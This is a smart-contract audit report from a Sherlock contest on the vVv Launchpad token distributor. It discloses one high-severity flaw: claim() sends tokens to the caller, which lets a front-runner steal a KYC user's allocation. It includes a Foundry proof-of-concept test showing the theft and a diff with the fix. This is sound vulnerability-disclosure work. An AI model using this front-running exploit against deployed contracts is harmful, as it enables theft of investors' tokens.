# vVv Launchpad - Investments & Token distribution Report
vVv facilitates both seed & launchpad deals. This contest focusses on the contracts required for running these investments and distributing the tokens to the investors.

* **nSLOC**: 279
* **Contest details**: https://audits.sherlock.xyz/contests/647

## Disclaimer
This report contains the valid findings discovered by me (merlinboii). 

Severity Criteria: [Criteria for Issue Validity | Sherlock V2](https://docs.sherlock.xyz/audits/real-time-judging/judging)

---

## Findings

| ID | Description | Severity |
| :-: | - | :-: |
|[H-01](#h-01)| Attacker will steal claiming funds from legitimate KYC users |🍅|

---

## <a name="h-01">[H-01]</a> Attacker will steal claiming funds from legitimate KYC users

* **Severity**: High
* Source: [merlinboii - Attacker will steal claiming funds from legitimate KYC users](https://github.com/sherlock-audit/2024-11-vvv-exchange-update-judging/issues/91)

---

### Summary

The logic in the [`VVVVCTokenDistributor::claim()`](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106-L145) **transfers the `projectToken` to the caller (`msg.sender`) instead of the intended `KYC address`**. This **enables an attacker to front-run the legitimate KYC user’s [`VVVVCTokenDistributor::claim()`](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106-L145) transaction**, allowing the attacker to receive the claiming funds on behalf of the KYC address specified in the signature.

---

### Root Cause

In [VVVVCTokenDistributor.sol::L130-L136](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L130-L136), the logic claims the `projectToken` to the caller (`msg.sender`) instead of the `KYC address`. 

This root cause allow the attacker to front running the [`VVVVCTokenDistributor::claim()`](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106-L145) call. 

This will steal the legitimate KYC user claiming funds and also block them to claim by that signature as it was used.

```solidity
File: vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol
106:     function claim(ClaimParams memory _params) public {
---
129:         // transfer tokens from each wallet to the caller
130:         for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
131:             projectToken.safeTransferFrom(
132:                 _params.projectTokenProxyWallets[i],
133:@>               msg.sender,    
134:                 _params.tokenAmountsToClaim[i]
135:             );
136:         }
```

---

### Internal pre-conditions

-

---

### External pre-conditions

As the [README](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/README.md#q-on-what-chains-are-the-smart-contracts-going-to-be-deployed) which is considered the **primary source of truth**, informs that the in-scope smart contracts will be deployed on both L1 and L2 chains:

> Q: On what chains are the smart contracts going to be deployed?
> Eth, base, bnb, avalanche, polkadot, arbitrum

This introduces the potential for front-running behavior.

---

### Attack Path

1. Alice do the KYC and put some investment tokens then she eligible to claim the `projectToken`
2. A trusted off-chain centralized system handles creating the claim signature for Alice that can claim `1000000e18` projectTokens
3. Alice want to claim her tokens
4. Stealer observes Alice's transaction, **front runs** and use that `Alice's claim params` to claim the Alice's claiming amount: `1000000e18`.
5. Alice's transaction is executed, since `nonce` is updated, Alice transaction reverts as [`InvalidNonce`](https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/main/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L115-L117)
6. **Bob profits `1000000e18`** and **Alice loses `1000000e18` projectTokens**.

---

### Impact

KYC users who invest and are eligible to claim **lose their entire claiming amount during the claiming process**. The **attacker gains the full claiming amount** from legitimate KYC users.

---

### PoC

#### Setup
* Put the snippet below into the protocol test suite: `vvv-platform-smart-contracts/test/vc/VVVVCTokenDistributor.unit.t.sol` 
* Run test:
`forge test --match-test testClaimByAttacker -vvv`

#### Coded PoC
<details>
  <summary>Coded PoC</summary>

```solidity
    function testClaimByAttacker() public {
        // defind an attacker/stealer
        address stealer = makeAddr("Stealer");

        address[] memory thisProjectTokenProxyWallets = new address[](1);
        uint256[] memory thisTokenAmountsToClaim = new uint256[](1);

        thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];

        uint256 claimAmount = sampleTokenAmountsToClaim[0];
        thisTokenAmountsToClaim[0] = claimAmount;

        VVVVCTokenDistributor.ClaimParams memory claimParams = generateClaimParamsWithSignature(
            sampleKycAddress,   //@audit -> legitimate KYC user -> Alice
            thisProjectTokenProxyWallets,
            thisTokenAmountsToClaim
        );

        // attacker claim on behalf of the `sampleKycAddress`
        vm.startPrank(stealer);
        TokenDistributorInstance.claim(claimParams);
        vm.stopPrank();
        // ensuring that the attacker can steal the claimAmount
        assertTrue(ProjectTokenInstance.balanceOf(stealer) == claimAmount);

        // assume that Alice claiming tx is executed after
        vm.startPrank(sampleKycAddress);
        vm.expectRevert(VVVVCTokenDistributor.InvalidNonce.selector);
        TokenDistributorInstance.claim(claimParams);
        vm.stopPrank();
    }
```
</details>

#### Result
Results of running the test:
```bash
Ran 1 test for test/vc/VVVVCTokenDistributor.unit.t.sol:VVVVCTokenDistributorUnitTests
[PASS] testClaimByAttacker() (gas: 123095)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.00ms (2.11ms CPU time)

Ran 1 test suite in 168.51ms (9.00ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

---

### Mitigation

Update the transfer logic to transfer tokens to the signed KYC address.

```diff
File: vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol
106:     function claim(ClaimParams memory _params) public {
---
129:         // transfer tokens from each wallet to the caller
130:         for (uint256 i = 0; i < _params.projectTokenProxyWallets.length; i++) {
131:             projectToken.safeTransferFrom(
132:                 _params.projectTokenProxyWallets[i],
-133:                 msg.sender,   
+133:                 _params.kycAddress,   
134:                 _params.tokenAmountsToClaim[i]
135:             );
136:         }
```